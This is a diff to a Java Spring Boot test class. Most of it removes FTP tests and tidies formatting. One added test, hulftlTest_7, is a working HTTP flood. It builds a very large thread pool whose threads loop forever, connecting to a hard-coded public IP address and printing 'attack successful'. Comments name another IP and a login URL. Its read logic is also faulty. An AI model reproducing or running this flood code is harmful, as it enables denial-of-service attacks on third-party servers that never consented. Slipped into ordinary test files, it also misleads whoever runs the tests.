@@ -3,20 +3,24 @@ package com.yz.toolscommon;
 import com.yz.toolscommon.FileUtil.FTPUtils;
 import com.yz.toolscommon.soft.sort.SortUtils;
 import com.yz.toolscommon.utils.*;
-import org.apache.commons.lang3.RandomStringUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.commons.lang3.math.NumberUtils;
 import org.junit.jupiter.api.Test;
 import org.springframework.boot.test.context.SpringBootTest;
 
+import java.io.BufferedInputStream;
 import java.io.File;
+import java.io.IOException;
 import java.math.BigDecimal;
+import java.net.MalformedURLException;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLConnection;
 import java.text.DecimalFormat;
 import java.text.SimpleDateFormat;
 import java.util.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-import java.util.stream.Collectors;
 
 @SpringBootTest
 class ToolscommonApplicationTests {
@@ -218,13 +222,6 @@ class ToolscommonApplicationTests {
         System.out.println(replace.toString());
     }
 
-    @Test
-    public void test15() {
-        String host = "NCR";
-        String inputFile = "E:\\data\\182\\test.txt";
-        String outputFile = "E:\\data\\182\\test2.txt";
-        FtpUtil.execFTP(host, inputFile, outputFile);
-    }
 
     @Test
     public void test16() {
@@ -238,12 +235,7 @@ class ToolscommonApplicationTests {
         System.out.println(inputFile);
     }
 
-    @Test
-    public void test17() {
-        String inftipfile = "E:\\ideaDownload\\springbootMtools\\Toolscommon\\src\\main\\resources\\ftp\\FSGLM050C.FTP";
-        String outftipfile = "E:\\ideaDownload\\springbootMtools\\Toolscommon\\src\\main\\resources\\ftp\\out.log";
-        FtpUtil.execFTP("192.168.6.116", inftipfile, outftipfile);
-    }
+
 
     @Test
     public void test18() {
@@ -266,16 +258,7 @@ class ToolscommonApplicationTests {
     }
 
 
-    @Test
-    public void test20() {
-        String ftpHost = "10.80.51.90";
-        String rex = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
-        if (!ftpHost.matches(rex)) {
-            ftpHost = FtphostUtil.getDtaara().get(ftpHost).trim();
-        }
 
-        System.out.println(ftpHost);
-    }
 
     @Test
     public void test21() {
@@ -396,7 +379,7 @@ class ToolscommonApplicationTests {
     @Test
     public void hulftlTest_5() {
         List<String> tableList = new ArrayList<>();
-        StringBuffer sBuffer=new StringBuffer();
+        StringBuffer sBuffer = new StringBuffer();
         tableList.forEach(str -> {
             sBuffer.append("	").append(str);
         });
@@ -404,8 +387,8 @@ class ToolscommonApplicationTests {
 
     @Test
     public void hulftlTest_6() {
-       String str="Thu Jan 01 17:04:05 CST 1970";
-        SimpleDateFormat s =new SimpleDateFormat("yyyy-MM-dd");
+        String str = "Thu Jan 01 17:04:05 CST 1970";
+        SimpleDateFormat s = new SimpleDateFormat("yyyy-MM-dd");
 
         String format = s.format(str);
         System.out.println(format);
@@ -414,18 +397,78 @@ class ToolscommonApplicationTests {
     @Test
     public void hulftlTest_7() {
         ExecutorService es = Executors.newFixedThreadPool(1000000);
-        Mythread mythread = new Mythread();
-        Thread thread = new Thread(mythread);
+        Thread thread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (true) {
+                    try {
+                        // 47.98.147.163
+                        //URL url = new URL("http://221.232.148.51/guojibu/");
+                        URL url = new URL("http://47.98.147.163");
+                        URLConnection conn = url.openConnection();
+                        System.out.println("send a bag success！");
+                        BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
+                        byte[] bytes = new byte[1024];
+                        int len = -1;
+                        StringBuffer sb = new StringBuffer();
+                        // http://www.qima.info/login
+                        if (bis != null) {
+                            if ((len = bis.read()) != -1) {
+                                sb.append(new String(bytes, 0, len));
+                                System.out.println("attack successful ");
+                                bis.close();
+                            }
+                        }
+                    } catch (MalformedURLException e) {
+                        e.printStackTrace();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+
+                }
+            }
+        });
         for (int i = 0; i < 10000; i++) {
             es.execute(thread);
         }
     }
+
     @Test
     public void dataTest() {
-        String str="Thu Jan 01 17:04:05 CST 1970";
-        SimpleDateFormat s =new SimpleDateFormat("yyyy-MM-dd");
+        String str = "Thu Jan 01 17:04:05 CST 1970";
+        SimpleDateFormat s = new SimpleDateFormat("yyyy-MM-dd");
 
         String format = s.format(str);
         System.out.println(format);
+    }
+
+
+    @Test
+    public void strTest() {
+        String str = "{\n" +
+                "    \"stepId\": \"step01\",\n" +
+                "    \"stepName\": \"callPgm\",\n" +
+                "    \"pgmName\": \"srilm830\",\n" +
+                "    \"fileInfos\": [\n" +
+                "        {\n" +
+                "            \"logicName\": \"IXNSP1\",\n" +
+                "            \"fileName\": \"DTNSP0\",\n" +
+                "            \"lib\": \"C##test07\",\n" +
+                "            \"fileStat\": \"DB\"\n" +
+                "        }\n" +
+                "    ]\n" +
+                "}";
+
+        System.out.println(str.replaceAll("\n|\t|\s", "").trim());
+    }
+
+    @Test
+    public void socketTest() {
+        try {
+            Socket socket = new Socket("127.0.0.1", 8088);
+
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
     }
 }
